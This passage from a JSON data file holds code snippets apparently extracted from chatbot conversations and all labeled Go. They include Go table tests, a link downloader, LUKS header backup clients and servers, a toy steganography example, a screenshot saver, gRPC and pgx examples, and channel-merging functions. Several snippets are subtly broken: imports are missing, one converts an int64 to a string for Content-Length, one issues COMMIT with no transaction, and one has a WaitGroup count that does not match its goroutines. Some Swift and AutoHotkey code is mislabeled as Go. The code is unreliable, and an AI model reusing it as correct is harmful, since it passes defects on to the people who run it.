test.Data().Validate())\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "9b43e8fbf2fbb4b91a3c8b953b776e99_2.go"
  },
  {
    "conversation_hash": "eee6a702d396b36e721f6e004565f56e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n    Name: \"crElasticRan integration request with empty CellsGroups\",\n    Data: func() *CrElasticRan {\n        data := TestCrElasticRan(t)\n        data.EUtranCellData.CellsGroups[\"Veon\"] = &EUtranCells{}\n        return data\n    },\n    IsValid: false,\n    ExpectedError: true, // Add this line to expect an error\n},",
    "filename": "eee6a702d396b36e721f6e004565f56e_0.go"
  },
  {
    "conversation_hash": "103a8a6f3f08098f53412e88f9b25d68",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func TestPort(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      []string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\"},\n\t\t\tname:       \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_IDL_C\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_A\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_2_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\ttnPort:     \"TN_A\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes:      []string{\"GRBS_41001_BCUKGU_1_KKT\", \"ERBS_41001_BCUKGU_1_KKT\"},\n\t\t\tname:       \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_IDL_C\",\n\t\t\ttnPort2:    \"TN_IDL_D\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\", \"ERBS_41001_BCUKGU_2_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_B\",\n\t\t\ttnPort2:    \"TN_A\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\", \"ERBS_41001_BCUKGU_2_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\ttnPort:     \"TN_A\",\n\t\t\ttnPort2:    \"TN_B\",\n\t\t},\n\t}\n\n\tfor _, c := range cases {\n\t\telasticran := &EranConnection{\n\t\t\tENodeB: &ENodeB{\n\t\t\t\tCellular: &Cellular{\n\t\t\t\t\tName: c.name,\n\t\t\t\t},\n\t\t\t\tSite: &Site{\n\t\t\t\t\tNodes: c.nodes,\n\t\t\t\t},\n\t\t\t},\n\t\t\tSubNetwork: &SubNetwork{\n\t\t\t\tName: c.subNetwork,\n\t\t\t},\n\t\t}\n\n\t\telasticran.port()\n\n\t\tif elasticran.TnPort != c.tnPort {\n\t\t\tt.Errorf(\"Expected TnPort to be %s, but got %s\", c.tnPort, elasticran.TnPort)\n\t\t}\n\n\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\tt.Errorf(\"Expected TnPort2 to be %s, but got %s\", c.tnPort2, elasticran.TnPort2)\n\t\t}\n\t}\n}",
    "filename": "103a8a6f3f08098f53412e88f9b25d68_0.go"
  },
  {
    "conversation_hash": "103a8a6f3f08098f53412e88f9b25d68",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func TestPort(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      []string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\"},\n\t\t\tname:       \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_IDL_C\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_A\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_2_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\ttnPort:     \"TN_A\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes:      []string{\"GRBS_41001_BCUKGU_1_KKT\", \"ERBS_41001_BCUKGU_1_KKT\"},\n\t\t\tname:       \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_IDL_C\",\n\t\t\ttnPort2:    \"TN_IDL_D\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\", \"ERBS_41001_BCUKGU_2_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_B\",\n\t\t\ttnPort2:    \"TN_A\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes:      []string{\"ERBS_41001_BCUKGU_1_KKT\", \"ERBS_41001_BCUKGU_2_KKT\"},\n\t\t\tname:       \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\ttnPort:     \"TN_A\",\n\t\t\ttnPort2:    \"TN_B\",\n\t\t},\n\t}\n\n\tfor _, c := range cases {\n\t\telasticran := EranConnection{\n\t\t\tENodeB: ENodeB{\n\t\t\t\tCellular: Cellular{\n\t\t\t\t\tName: c.name,\n\t\t\t\t},\n\t\t\t\tSite: Site{\n\t\t\t\t\tNodes: c.nodes,\n\t\t\t\t},\n\t\t\t},\n\t\t\tSubNetwork: SubNetwork{\n\t\t\t\tName: c.subNetwork,\n\t\t\t},\n\t\t}\n\n\t\telasticran.port()\n\n\t\tif elasticran.TnPort != c.tnPort {\n\t\t\tt.Errorf(\"Expected TnPort to be %s, but got %s\", c.tnPort, elasticran.TnPort)\n\t\t}\n\n\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\tt.Errorf(\"Expected TnPort2 to be %s, but got %s\", c.tnPort2, elasticran.TnPort2)\n\t\t}\n\t}\n}",
    "filename": "103a8a6f3f08098f53412e88f9b25d68_1.go"
  },
  {
    "conversation_hash": "786fece500f9cecb3f9c0d226f34becc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\n\t\"golang.org/x/net/html\"\n)\n\nfunc main() {\n\turl := \"https://example.com\" // Replace with the URL you want to parse\n\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to retrieve the webpage:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\tz := html.NewTokenizer(resp.Body)\n\n\tfor {\n\t\ttokenType := z.Next()\n\n\t\tswitch tokenType {\n\t\tcase html.ErrorToken:\n\t\t\tif z.Err() == io.EOF {\n\t\t\t\t// End of the document\n\t\t\t\treturn\n\t\t\t}\n\t\t\tfmt.Println(\"Error encountered while parsing HTML:\", z.Err())\n\t\t\treturn\n\n\t\tcase html.StartTagToken:\n\t\t\ttoken := z.Token()\n\n\t\t\tif token.Data == \"a\" {\n\t\t\t\tfor _, attr := range token.Attr {\n\t\t\t\t\tif attr.Key == \"href\" {\n\t\t\t\t\t\tfileURL := attr.Val\n\t\t\t\t\t\tif strings.HasSuffix(fileURL, \".pdf\") || strings.HasSuffix(fileURL, \".zip\") {\n\t\t\t\t\t\t\tgo downloadFile(fileURL)\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc downloadFile(url string) {\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to download file:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\tfilename := getLastPathSegment(url)\n\tout, err := os.Create(filename)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to create file:\", err)\n\t\treturn\n\t}\n\tdefer out.Close()\n\n\t_, err = io.Copy(out, resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to write file:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Downloaded:\", filename)\n}\n\nfunc getLastPathSegment(url string) string {\n\tsegments := strings.Split(url, \"/\")\n\treturn segments[len(segments)-1]\n}",
    "filename": "786fece500f9cecb3f9c0d226f34becc_0.go"
  },
  {
    "conversation_hash": "c4e3f0af05998142010da5998b65caa4",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "actor MyActor {\n    func executeInMainThread() {\n        Task {\n            await MainActor.run {\n                // Код, который должен быть выполнен в главном потоке\n            }\n        }\n    }\n}",
    "filename": "c4e3f0af05998142010da5998b65caa4_4.go"
  },
  {
    "conversation_hash": "c4e3f0af05998142010da5998b65caa4",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "actor MyActor {\n    func executeInBackground() {\n        Task.detached {\n            // Код, который должен быть выполнен в глобальном потоке\n        }\n    }\n}",
    "filename": "c4e3f0af05998142010da5998b65caa4_5.go"
  },
  {
    "conversation_hash": "485d14017fe2854f3ee3df0eb03cb176",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n)\n\n// Server URL where LUKS headers are stored\nconst serverURL = \"http://your-server.com/luks-headers\"\n\n// Local storage path for the LUKS headers\nconst localPath = \"/etc/luks-headers\"\n\nfunc main() {\n\t// Fetch LUKS headers from the server\n\terr := fetchHeaders()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Load LUKS headers during booting process\n\terr = loadHeaders()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Proceed with the rest of the boot process\n\tfmt.Println(\"LUKS headers loaded successfully.\")\n}\n\nfunc fetchHeaders() error {\n\t// Send a GET request to the server to fetch the LUKS headers\n\tresponse, err := http.Get(serverURL)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer response.Body.Close()\n\n\t// Read the response body\n\tbody, err := ioutil.ReadAll(response.Body)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Save the LUKS headers to the local storage path\n\terr = ioutil.WriteFile(localPath, body, 0644)\n\tif os.IsNotExist(err) {\n\t\t// Create the directory if it doesn't exist\n\t\terr = os.MkdirAll(filepath.Dir(localPath), os.ModePerm)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\t// Retry writing the file\n\t\terr = ioutil.WriteFile(localPath, body, 0644)\n\t}\n\n\treturn err\n}\n\nfunc loadHeaders() error {\n\t// Code to load LUKS headers during the boot process\n\t// Implement according to your system's boot procedure\n\treturn nil\n}",
    "filename": "485d14017fe2854f3ee3df0eb03cb176_0.go"
  },
  {
    "conversation_hash": "5095dfeedb43fbf7235e2cd9f0649cc5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc handleLUKSHeaderBackup(w http.ResponseWriter, r *http.Request) {\n\t// Path to the LUKS header file\n\tluksHeaderPath := \"/path/to/luks_header_file.img\"\n\n\t// Open the LUKS header file\n\tluksHeaderFile, err := os.Open(luksHeaderPath)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tdefer luksHeaderFile.Close()\n\n\t// Set the appropriate headers for the response\n\tw.Header().Set(\"Content-Disposition\", \"attachment; filename=luks_header.img\")\n\tw.Header().Set(\"Content-Type\", \"application/octet-stream\")\n\tw.Header().Set(\"Content-Length\", string(StatFileSize(luksHeaderPath)))\n\n\t// Copy the LUKS header file to the response writer\n\t_, err = io.Copy(w, luksHeaderFile)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n}\n\nfunc main() {\n\t// Set up a basic HTTP server\n\thttp.HandleFunc(\"/backup_luks_header\", handleLUKSHeaderBackup)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tlog.Fatal(\"Error starting HTTP server: \", err)\n\t}\n}\n\n// StatFileSize returns the file size of a given path\nfunc StatFileSize(path string) int64 {\n\tfileInfo, err := os.Stat(path)\n\tif err != nil {\n\t\tlog.Fatal(\"Error getting file info: \", err)\n\t}\n\treturn fileInfo.Size()\n}",
    "filename": "5095dfeedb43fbf7235e2cd9f0649cc5_0.go"
  },
  {
    "conversation_hash": "30fe4b25a298bc1693663bfd3536dffd",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "backup"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Specify the path to the LUKS header file\n\tluksHeaderFile := \"/path/to/luks/header.img\"\n\n\t// Read the LUKS header file\n\tluksHeader, err := ioutil.ReadFile(luksHeaderFile)\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to read LUKS header file:\", err)\n\t}\n\n\t// Define the target URL of the backup server\n\tbackupServerURL := \"http://localhost:8080/backup\" // Update with the actual URL\n\n\t// Send the LUKS headers to the backup server\n\terr = sendHeadersToBackupServer(luksHeader, backupServerURL)\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to send LUKS headers to backup server:\", err)\n\t}\n\n\tfmt.Println(\"LUKS headers sent successfully to backup server!\")\n}\n\nfunc sendHeadersToBackupServer(headers []byte, url string) error {\n\t// Create a new HTTP POST request to the specified URL\n\treq, err := http.NewRequest(http.MethodPost, url, nil)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Set the LUKS headers as the request body\n\treq.Body = ioutil.NopCloser(bytes.NewReader(headers))\n\n\t// Set the appropriate headers for LUKS headers\n\treq.Header.Set(\"Content-Type\", \"application/octet-stream\")\n\treq.ContentLength = int64(len(headers))\n\n\t// Send the request to the backup server\n\tclient := http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\tif resp.StatusCode != http.StatusOK {\n\t\treturn fmt.Errorf(\"unexpected response from backup server: %s\", resp.Status)\n\t}\n\n\treturn nil\n}",
    "filename": "30fe4b25a298bc1693663bfd3536dffd_0.go"
  },
  {
    "conversation_hash": "46590127cca198ef82a1b39f4930bea1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n)\n\n// Function to convert a string to base64 encoded string\nfunc toBase64(s string) string {\n\treturn base64.StdEncoding.EncodeToString([]byte(s))\n}\n\n// Function to decode base64 encoded string to normal sentence\nfunc fromBase64(s string) (string, error) {\n\tdecoded, err := base64.StdEncoding.DecodeString(s)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\treturn string(decoded), nil\n}\n\nfunc main() {\n\tsentence := \"This is a secret message\"\n\tencoded := toBase64(sentence)\n\tfmt.Println(\"Base64 Encoded:\", encoded)\n\n\tdecoded, err := fromBase64(encoded)\n\tif err != nil {\n\t\tfmt.Println(\"Error decoding base64:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"Decoded sentence:\", decoded)\n}",
    "filename": "46590127cca198ef82a1b39f4930bea1_0.go"
  },
  {
    "conversation_hash": "46590127cca198ef82a1b39f4930bea1",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "a",
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\n// Function to hide a message within normal sentences\nfunc hideMessage(sentence string, message string) string {\n\t// Convert the message to lowercase\n\tmessage = strings.ToLower(message)\n\n\t// Replace spaces in the sentence with corresponding characters from the message\n\thidden := \"\"\n\tj := 0\n\tfor _, char := range sentence {\n\t\tif char == ' ' {\n\t\t\t// If the character is a space, replace it with the next character from the message\n\t\t\tif j < len(message) {\n\t\t\t\thidden += string(message[j])\n\t\t\t\tj++\n\t\t\t} else {\n\t\t\t\t// If the message is longer than the spaces in the sentence, add extra spaces at the end\n\t\t\t\thidden += \" \"\n\t\t\t}\n\t\t} else {\n\t\t\thidden += string(char)\n\t\t}\n\t}\n\n\treturn hidden\n}\n\n// Function to extract the hidden message from a sentence\nfunc extractMessage(sentence string) string {\n\tmessage := \"\"\n\tfor _, char := range sentence {\n\t\t// Consider only lowercase alphabets and spaces\n\t\tif char >= 'a' && char <= 'z' || char == ' ' {\n\t\t\tmessage += string(char)\n\t\t}\n\t}\n\n\treturn message\n}\n\nfunc main() {\n\toriginalSentence := \"This is a normal sentence\"\n\tmessage := \"hidden message\"\n\n\thidden := hideMessage(originalSentence, message)\n\tfmt.Println(\"Hidden sentence:\", hidden)\n\n\textracted := extractMessage(hidden)\n\tfmt.Println(\"Extracted message:\", extracted)\n}",
    "filename": "46590127cca198ef82a1b39f4930bea1_1.go"
  },
  {
    "conversation_hash": "f57847cdeb1bc40efdca65ca586b62d3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func createTable(pool *pgxpool.Pool) error {\n\t// Specify the table name and columns\n\ttableName := \"your_table_name\"\n\tcolumns := map[string]interface{}{\n\t\t\"id\":      \"SERIAL PRIMARY KEY\",\n\t\t\"name\":    \"VARCHAR(255)\",\n\t\t\"age\":     \"INTEGER\",\n\t\t\"address\": \"VARCHAR(255)\",\n\t\t// Add more columns as needed\n\t}\n\n\t// Start building the query\n\tquery := fmt.Sprintf(\"CREATE TABLE IF NOT EXISTS %s (\", tableName)\n\n\t// Iterate over the column definitions and add them to the query\n\tfor columnName, columnType := range columns {\n\t\tquery += fmt.Sprintf(\"%s %s, \", columnName, columnType)\n\t}\n\n\t// Remove the extra comma and space\n\tquery = query[:len(query)-2] + \")\"\n\n\t// Execute the query\n\t_, err := pool.Exec(context.Background(), query)\n\treturn err\n}",
    "filename": "f57847cdeb1bc40efdca65ca586b62d3_1.go"
  },
  {
    "conversation_hash": "f57847cdeb1bc40efdca65ca586b62d3",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func createTable(conn *pgx.Conn) error {\n\t// Specify the table name and columns\n\ttableName := \"your_table_name\"\n\tcolumns := map[string]interface{}{\n\t\t\"id\":      \"SERIAL PRIMARY KEY\",\n\t\t\"name\":    \"VARCHAR(255)\",\n\t\t\"age\":     \"INTEGER\",\n\t\t\"address\": \"VARCHAR(255)\",\n\t\t// Add more columns as needed\n\t}\n\n\t// Start building the query\n\tquery := fmt.Sprintf(\"CREATE TABLE IF NOT EXISTS %s (\", tableName)\n\n\t// Iterate over the column definitions and add them to the query\n\tfor columnName, columnType := range columns {\n\t\tquery += fmt.Sprintf(\"%s %s, \", columnName, columnType)\n\t}\n\n\t// Remove the extra comma and space\n\tquery = query[:len(query)-2] + \")\"\n\n\t// Execute the query\n\t_, err := conn.Exec(context.Background(), query)\n\treturn err\n}",
    "filename": "f57847cdeb1bc40efdca65ca586b62d3_4.go"
  },
  {
    "conversation_hash": "f57847cdeb1bc40efdca65ca586b62d3",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func createTable(conn *pgx.Conn) error {\n\t// Specify the table name and columns\n\ttableName := \"your_table_name\"\n\tcolumns := map[string]interface{}{\n\t\t\"id\":      \"SERIAL PRIMARY KEY\",\n\t\t\"name\":    \"VARCHAR(255)\",\n\t\t\"age\":     \"INTEGER\",\n\t\t\"address\": \"VARCHAR(255)\",\n\t\t\"weight\":  \"FLOAT8\",\n\t\t\"score\":   \"DOUBLE PRECISION\",\n\t\t\"active\":  \"BOOLEAN\",\n\t}\n\n\t// Start building the query\n\tquery := fmt.Sprintf(\"CREATE TABLE IF NOT EXISTS %s (\", tableName)\n\n\t// Iterate over the column definitions and add them to the query\n\tfor columnName, columnType := range columns {\n\t\tquery += fmt.Sprintf(\"%s %s, \", columnName, columnType)\n\t}\n\n\t// Remove the extra comma and space\n\tquery = query[:len(query)-2] + \")\"\n\n\t// Execute the query\n\t_, err := conn.Exec(context.Background(), query)\n\treturn err\n}",
    "filename": "f57847cdeb1bc40efdca65ca586b62d3_6.go"
  },
  {
    "conversation_hash": "f57847cdeb1bc40efdca65ca586b62d3",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func executeBatch(conn *pgx.Conn) error {\n\t// Create a batch\n\tbatch := &pgx.Batch{}\n\n\t// Add queries to the batch\n\tquery1 := \"INSERT INTO your_table_name (column1, column2) VALUES ($1, $2)\"\n\targs1 := []interface{}{\"value1\", 123}\n\tbatch.Queue(query1, args1...)\n\n\tquery2 := \"UPDATE your_table_name SET column1 = $1 WHERE id = $2\"\n\targs2 := []interface{}{\"new value\", 1}\n\tbatch.Queue(query2, args2...)\n\n\t// Execute the batch as a transaction\n\tbr := conn.SendBatch(context.Background(), batch)\n\tdefer br.Close()\n\n\t// Process the batch results\n\tfor i := 0; i < batch.Len(); i++ {\n\t\tresult, err := br.Exec()\n\t\tif err != nil {\n\t\t\t// Handle error if any\n\t\t\treturn err\n\t\t}\n\t\t_ = result\n\t\t// Process the result if needed\n\t}\n\n\t// Commit the transaction\n\t_, err := conn.Exec(context.Background(), \"COMMIT\")\n\treturn err\n}",
    "filename": "f57847cdeb1bc40efdca65ca586b62d3_7.go"
  },
  {
    "conversation_hash": "79e88c501cd3c906de3f7fe5e434abcc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"image/png\"\n\t\"os\"\n\n\t\"github.com/kbinani/screenshot\"\n)\n\nfunc main() {\n\t// 获取屏幕的尺寸\n\tbounds := screenshot.GetDisplayBounds(0)\n\n\t// 创建一个空白的图像对象\n\timg, err := screenshot.CaptureRect(bounds)\n\tif err != nil {\n\t\tfmt.Println(\"无法截取屏幕图像：\", err)\n\t\treturn\n\t}\n\n\t// 创建一个文件来保存截图\n\tfile, err := os.Create(\"screenshot.png\")\n\tif err != nil {\n\t\tfmt.Println(\"无法创建文件：\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// 使用png编码器将图像保存到文件中\n\terr = png.Encode(file, img)\n\tif err != nil {\n\t\tfmt.Println(\"无法保存图像：\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"截图保存成功\")\n}",
    "filename": "79e88c501cd3c906de3f7fe5e434abcc_0.go"
  },
  {
    "conversation_hash": "fd100945a3b011199b73d5266912a3e7",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "; Show a message box based on the value of the variable \"x\"\nx := 7\nif (x > 5) {\n    MsgBox x is greater than 5.\n} else {\n    MsgBox x is less than or equal to 5.\n}",
    "filename": "fd100945a3b011199b73d5266912a3e7_6.go"
  },
  {
    "conversation_hash": "2f2955d927a9cd232027466128fe50ea",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"example\"\n\n\t\"google.golang.org/grpc\"\n)\n\ntype APIServiceServer struct{}\n\nfunc (s *APIServiceServer) GetData(ctx context.Context, req *example.GetDataRequest) (*example.GetDataResponse, error) {\n\tquery := req.GetQuery()\n\t// Здесь может быть логика обработки запроса и получение данных\n\tresult := \"Response for query: \" + query\n\treturn &example.GetDataResponse{Result: result}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", \"localhost:50051\")\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\n\tserver := grpc.NewServer()\n\texample.RegisterAPIServiceServer(server, &APIServiceServer{})\n\n\tlog.Println(\"Starting gRPC server...\")\n\tif err := server.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}",
    "filename": "2f2955d927a9cd232027466128fe50ea_2.go"
  },
  {
    "conversation_hash": "2f2955d927a9cd232027466128fe50ea",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\n\t\"example\"\n\n\t\"google.golang.org/grpc\"\n)\n\nfunc main() {\n\tconn, err := grpc.Dial(\"localhost:50051\", grpc.WithInsecure())\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\n\tclient := example.NewAPIServiceClient(conn)\n\n\tquery := \"some query\"\n\tresponse, err := client.GetData(context.Background(), &example.GetDataRequest{Query: query})\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to get data: %v\", err)\n\t}\n\n\tresult := response.GetResult()\n\tlog.Printf(\"Got result: %s\", result)\n\n\t// Здесь можно обработать результат и выполнить соответствующие действия\n}",
    "filename": "2f2955d927a9cd232027466128fe50ea_3.go"
  },
  {
    "conversation_hash": "d6665ddb396f7218e3aaca5664f18020",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func unmarshalJson(data []byte, v interface{}) {\n\terr := json.Unmarshal(data, v)\n\tif err != nil {\n\t\tlog.Fatalln(\"Error unmarshaling json:\", err)\n\t}\n}",
    "filename": "d6665ddb396f7218e3aaca5664f18020_0.go"
  },
  {
    "conversation_hash": "862dee81775d5cd2cd7ada0dde037529",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func merge2Channels(in1 <-chan int, in2 <-chan int, n int) {\n\twg := &sync.WaitGroup{}\n\twg.Add(2)\n\n\tx1 := make([]int, n)\n\tx2 := make([]int, n)\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\ti := 0\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase val, ok := <-in1:\n\t\t\t\tif !ok {\n\t\t\t\t\tin1 = nil\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tx1[i] = val\n\t\t\t\tfmt.Println(i, \" \", val)\n\t\t\t\ti++\n\t\t\tcase <-in2:\n\t\t\t\tif !ok {\n\t\t\t\t\tin2 = nil\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tval, ok := <-in2\n\t\t\t\tx2[i] = val\n\t\t\t\tfmt.Println(i, \" \", val)\n\t\t\t\ti++\n\t\t\t}\n\n\t\t\tif in1 == nil && in2 == nil {\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\ti := 0\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase val, ok := <-in2:\n\t\t\t\tif !ok {\n\t\t\t\t\tin2 = nil\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tx2[i] = val\n\t\t\t\tfmt.Println(i, \" \", val)\n\t\t\t\ti++\n\t\t\tcase <-in1:\n\t\t\t\tif !ok {\n\t\t\t\t\tin1 = nil\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tval, ok := <-in1\n\t\t\t\tx1[i] = val\n\t\t\t\tfmt.Println(i, \" \", val)\n\t\t\t\ti++\n\t\t\t}\n\n\t\t\tif in1 == nil && in2 == nil {\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t}()\n\n\twg.Wait()\n}",
    "filename": "862dee81775d5cd2cd7ada0dde037529_0.go"
  },
  {
    "conversation_hash": "862dee81775d5cd2cd7ada0dde037529",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\twg := &sync.WaitGroup{}\n\twg.Add(4)\n\n\tx1 := make([]int, n)\n\tx2 := make([]int, n)\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tval := <-in1\n\t\t\tx1[i] = val\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tval := <-in2\n\t\t\tx2[i] = val\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tx1[i] = fn(x1[i])\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tx2[i] = fn(x2[i])\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\twg.Wait()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tout <- x1[i] + x2[i]\n\t\t}\n\t\tclose(out)\n\t}()\n}",
    "filename": "862dee81775d5cd2cd7ada0dde037529_1.go"
  },
  {
    "conversation_hash": "862dee81775d5cd2cd7ada0dde037529",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
